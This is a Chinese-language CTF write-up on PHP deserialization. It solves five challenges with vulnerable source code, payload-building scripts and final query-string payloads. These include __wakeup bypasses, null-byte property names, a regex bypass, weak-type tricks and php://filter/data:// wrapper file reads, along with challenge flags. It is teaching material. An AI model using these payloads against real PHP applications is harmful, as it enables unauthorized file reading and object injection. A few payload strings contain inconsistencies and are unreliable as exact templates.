---
layout: post
title:  PHP serialize
date:   2021-06-21 00:01:01 +0300
image:  2021-06-21-girl.jpg
tags:   [ctf,web,php,serialize]
---

#### 序列化和反序列化的概念

序列化就是将对象转换成字符串。字符串包括 属性名 属性值 属性类型和该对象对应的类名。
反序列化则相反将字符串重新恢复成对象。
对象的序列化利于对象的保存和传输,也可以让多个文件共享对象。

#### 序列化中常见的魔法函数：

```assembly
__construct() 创建对象时调用
__destruct() 销毁对象时调用
__toString() 当一个对象被当作一个字符串使用
__sleep() 在对象在被序列化之前运行
__wakeup 将在序列化之后立即被调用
```

#### 序列化后

```assembly
O:<length>:"<class name>":<n>:{<field name 1><field value 1>...<field name n><field value n>} 
```

* O:表示序列化的事对象
* < length>:表示序列化的类名称长度
* < class name>：表示序列化的类的名称
* < n >:表示被序列化的对象的属性个数
* < field name 1>：属性名
* < field value 1>：属性值

#### 访问控制修饰符

根据访问控制修饰符的不同 序列化后的属性长度和属性值会有所不同.

* public(公有)
* protected(受保护)
* private(私有的)
* protected属性被序列化的时候属性值会变成：%00*%00属性名
* private属性被序列化的时候属性值会变成：%00类名%00属性名

---------------------------

### unserialize3

打开网页给了源码

```assembly
class xctf{
public $flag = '111';
public function __wakeup(){
exit('bad requests');
}
}
?code=
```

__wakeup 经常用在反序列化操作中，例如重新建立数据库连接，或执行其它初始化操作。所以猜测被反序列化了

写一段代码执行

```assembly
<?php

class xctf
{
    public $flag = '111';

    public function __wakeup()
    {
        exit('bad requests');
    }
}

$ctf = new xctf();

echo(serialize($ctf));
```

运行结果

`O:4:"xctf":1:{s:4:"flag";s:3:"111";}`

如果直接传参给code会被\_\_wakeup()函数再次序列化，所以要绕过他。
利用\_\_wakeup()函数漏洞原理：当序列化字符串表示对象属性个数的值大于真实个数的属性时就会跳过\_\_wakeup()的执行。

把序列化字符串改为

`O:4:"xctf":2:{s:4:"flag";s:3:"111";}`

?code=O:4:"xctf":2:{s:4:"flag";s:3:"111";}

得到flag

cyberpeace{4514da5c7a176a598000c395cd2821d7}

### [极客大挑战 2019]PHP

主页提示：`因为每次猫猫都在我键盘上乱跳，所以我有一个良好的备份网站的习惯`

`不愧是我！！！`

扫描后台得到www.zip

flag.php

```assembly
<?php
$flag = 'Syc{dog_dog_dog_dog}';
?>
```

index.php

```assembly
<?php
include 'class.php';
$select = $_GET['select'];
$res=unserialize(@$select);
?>
```

class.php

```assembly
<?php
include 'flag.php';


error_reporting(0);


class Name{
    private $username = 'nonono';
    private $password = 'yesyes';

    public function __construct($username,$password){
        $this->username = $username;
        $this->password = $password;
    }

    function __wakeup(){
        $this->username = 'guest';
    }

    function __destruct(){
        if ($this->password != 100) {
            echo "</br>NO!!!hacker!!!</br>";
            echo "You name is: ";
            echo $this->username;echo "</br>";
            echo "You password is: ";
            echo $this->password;echo "</br>";
            die();
        }
        if ($this->username === 'admin') {
            global $flag;
            echo $flag;
        }else{
            echo "</br>hello my friend~~</br>sorry i can't give you the flag!";
            die();

            
        }
    }
}
?>
```

执行

```assembly
<?php

$name = new Name('admin', 100);
echo(serialize($name));
```

`O:4:"Name":2:{s:14:" Name username";s:5:"admin";s:14:" Name password";i:100;}`

绕过\_\_wakeup()

`O:4:"Name":3:{s:14:" Name username";s:5:"admin";s:14:" Name password";i:100;}`

private属性被序列化的时候属性值会变成%00类名%00属性名,根据规则进行修改

`O:4:"Name":3:{s:14:"%00Name%00username";s:5:"admin";s:14:"%00Name%00password";i:100;}`

?select=O:4:"Name":3:{s:14:"%00Name%00username";s:5:"admin";s:14:"%00Name%00password";i:100;}

flag{6cbb5b95-dcf1-421a-b074-f7db9d370860}

### [网鼎杯 2020 青龙组]AreUSerialz

题目给了源码

```assembly
<?php

include("flag.php");

highlight_file(__FILE__);

class FileHandler {

    protected $op;
    protected $filename;
    protected $content;

    function __construct() {
        $op = "1";
        $filename = "/tmp/tmpfile";
        $content = "Hello World!";
        $this->process();
    }

    public function process() {
        if($this->op == "1") {
            $this->write();
        } else if($this->op == "2") {
            $res = $this->read();
            $this->output($res);
        } else {
            $this->output("Bad Hacker!");
        }
    }

    private function write() {
        if(isset($this->filename) && isset($this->content)) {
            if(strlen((string)$this->content) > 100) {
                $this->output("Too long!");
                die();
            }
            $res = file_put_contents($this->filename, $this->content);
            if($res) $this->output("Successful!");
            else $this->output("Failed!");
        } else {
            $this->output("Failed!");
        }
    }

    private function read() {
        $res = "";
        if(isset($this->filename)) {
            $res = file_get_contents($this->filename);
        }
        return $res;
    }

    private function output($s) {
        echo "[Result]: <br>";
        echo $s;
    }

    function __destruct() {
        if($this->op === "2")
            $this->op = "1";
        $this->content = "";
        $this->process();
    }

}

function is_valid($s) {
    for($i = 0; $i < strlen($s); $i++)
        if(!(ord($s[$i]) >= 32 && ord($s[$i]) <= 125))
            return false;
    return true;
}

if(isset($_GET{'str'})) {

    $str = (string)$_GET['str'];
    if(is_valid($str)) {
        $obj = unserialize($str);
    }

}
```

执行

```assembly
<?php

$file = new FileHandler();
echo(serialize($file));
```

`O:11:"FileHandler":3:{s:5:" * op";N;s:11:" * filename";N;s:10:" * content";N;}`

根据

$op = "2";
$filename = "flag.php";

`O:11:"FileHandler":3:{s:5:"%00*%00op";s:1:"2";s:11:"%00*%00filename";i:8:"flag.php";s:10:"%00*%00content";N;}`

因为在进行read()之前就会调用__destruct()魔术方法__

destruct()方法内使用了严格相等 this->op === “2”，process()方法内使用了else if ( this->op == “2”)，所以这里使用弱类型2 == "2"绕过。

`O:11:"FileHandler":3:{s:5:"%00*%00op";i:2;s:11:"%00*%00filename";i:8:"flag.php";s:10:"%00*%00content";N;}`

is_vaild()函数,它规定了序列化内容中只能包含ascii可见字符，而%00不是可见字符，php7.1+对类属性的检测不严格，所以可以用public来突破。

`O:11:"FileHandler":3:{s:2:"op";i:2;s:8:"filename";s:8:"flag.php";s:7:"content";N;}`

?str=O:11:"FileHandler":3:{s:2:"op";i:2;s:8:"filename";s:8:"flag.php";s:7:"content";N;}

flag{c8f14fd4-5455-4c8a-bdc9-785970e852f5}

### Web_php_unserialize

```assembly
<?php 
class Demo { 
    private $file = 'index.php';
    public function __construct($file) { 
        $this->file = $file; 
    }
    function __destruct() { 
        echo @highlight_file($this->file, true); 
    }
    function __wakeup() { 
        if ($this->file != 'index.php') { 
            //the secret is in the fl4g.php
            $this->file = 'index.php'; 
        } 
    } 
}
if (isset($_GET['var'])) { 
    $var = base64_decode($_GET['var']); 
    if (preg_match('/[oc]:\d+:/i', $var)) { 
        die('stop hacking!'); 
    } else {
        @unserialize($var); 
    } 
} else { 
    highlight_file("index.php"); 
} 
?>
```

**/[oc]:\d+:/i**
OC：正则表达式

* \d:  匹配一个数字字符。等价于 [0-9]。
*  +:  匹配前面的子表达式一次或多次。例如，'zo+' 能匹配 "zo" 以及 "zoo"，但不能匹配 "z"。+ 等价于 {1,}。
* /i:  表示匹配的时候不区分大小写

所以这个正则表达式就是查看是否有数字。

绕过方法：在数字前面加一个'+'.

执行

```assembly
<?php

$demo = new Demo("flag.php");
echo(serialize($demo));
```

`O:4:"Demo":1:{s:10:" Demo file";s:8:"fl4g.php";}`

绕过\_\_wakeup()

`O:4:"Demo":2:{s:10:" Demo file";s:8:"fl4g.php";}`

绕过正则表达式

`O:+4:"Demo":2:{s:10:" Demo file";s:8:"fl4g.php";}`

base64加密

TzorNDoiRGVtbyI6Mjp7czoxMDoiIERlbW8gZmlsZSI7czo4OiJmbDRnLnBocCI7fQ==

?var=TzorNDoiRGVtbyI6Mjp7czoxMDoiIERlbW8gZmlsZSI7czo4OiJmbDRnLnBocCI7fQ==

不对

```assembly
<?php 
class Demo { 
    private $file = 'index.php';
    public function __construct($file) { 
        $this->file = $file;
    }
    function __destruct() { 
        echo @highlight_file($this->file, true); 
    }
    function __wakeup() { 
        if ($this->file != 'index.php') { 
            //the secret is in the fl4g.php
            $this->file = 'index.php'; 
        } 
    } 
}
    $A = new Demo('fl4g.php');
    $C = serialize($A);
    //string(49) "O:4:"Demo":1:{s:10:"Demofile";s:8:"fl4g.php";}"
    $C = str_replace('O:4', 'O:+4',$C);//绕过preg_match
    $C = str_replace(':1:', ':2:',$C);//绕过wakeup
    var_dump($C);
    //string(49) "O:+4:"Demo":2:{s:10:"Demofile";s:8:"fl4g.php";}"
    var_dump(base64_encode($C));
    //string(68) "TzorNDoiRGVtbyI6Mjp7czoxMDoiAERlbW8AZmlsZSI7czo4OiJmbDRnLnBocCI7fQ=="
?>
```

?var=TzorNDoiRGVtbyI6Mjp7czoxMDoiAERlbW8AZmlsZSI7czo4OiJmbDRnLnBocCI7fQ==

得到flag

ctf{b17bd4c7-34c9-4526-8fa8-a0794a197013}

### [ZJCTF 2019]NiZhuanSiWei

```assembly
<?php  
$text = $_GET["text"];
$file = $_GET["file"];
$password = $_GET["password"];
if(isset($text)&&(file_get_contents($text,'r')==="welcome to the zjctf")){
    echo "<br><h1>".file_get_contents($text,'r')."</h1></br>";
    if(preg_match("/flag/",$file)){
        echo "Not now!";
        exit(); 
    }else{
        include($file);  //useless.php
        $password = unserialize($password);
        echo $password;
    }
}
else{
    highlight_file(__FILE__);
}
?>
```

**file_get_contents**

(PHP 4 >= 4.3.0, PHP 5, PHP 7, PHP 8)

file_get_contents — 将整个文件读入一个字符串

#### 说明

file_get_contents(
  string `$filename`,
  bool `$use_include_path` = **`false`**,
  resource `$context` = ?,
  int `$offset` = 0,
  int `$length` = ?
): string|false

和 [file()](https://www.php.net/manual/zh/function.file.php) 一样，只除了 **file_get_contents()** 把文件读入一个字符串。将在参数 `offset` 所指定的位置开始读取长度为 `length` 的内容。如果失败，**file_get_contents()** 将返回 **`false`**。

**file_get_contents()** 函数是用来将文件的内容读入到一个字符串中的首选方法。如果操作系统支持还会使用内存映射技术来增强性能。

需要让$text输入 ”welcome to the zjctf“ 传入文件中才能进行后面的步骤，用data伪协议传参

```assembly
?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=
```

接下来就是file的那个点。直接访问flag.php不能得到php的内容，因此需要利用文件包含。题目提示了useless.php，利用php伪协议读取一下useless.php:

```assembly
php://filter/read=convert.base64-encode/resource=useless.php
```

`?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&file=php://filter/read=convert.base64-encode/resource=useless.php`

得到

`PD9waHAgIAoKY2xhc3MgRmxhZ3sgIC8vZmxhZy5waHAgIAogICAgcHVibGljICRmaWxlOyAgCiAgICBwdWJsaWMgZnVuY3Rpb24gX190b3N0cmluZygpeyAgCiAgICAgICAgaWYoaXNzZXQoJHRoaXMtPmZpbGUpKXsgIAogICAgICAgICAgICBlY2hvIGZpbGVfZ2V0X2NvbnRlbnRzKCR0aGlzLT5maWxlKTsgCiAgICAgICAgICAgIGVjaG8gIjxicj4iOwogICAgICAgIHJldHVybiAoIlUgUiBTTyBDTE9TRSAhLy8vQ09NRSBPTiBQTFoiKTsKICAgICAgICB9ICAKICAgIH0gIAp9ICAKPz4gIAo=`

```assembly
<?php  

class Flag{  //flag.php  
    public $file;  
    public function __tostring(){  
        if(isset($this->file)){  
            echo file_get_contents($this->file); 
            echo "<br>";
        return ("U R SO CLOSE !///COME ON PLZ");
        }  
    }  
}  
?>  
```

本地运行

```assembly
$flag = new Flag();
echo(serialize($flag));
```

`O:4:"Flag":1:{s:4:"file";N;}`

payload

`?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&file=useless.php&password=O:4:"Flag":1:{s:4:"file";s:8:"flag.php";}`

F12得到flag

flag{befe5973-143f-4588-a7f8-59227badd67d}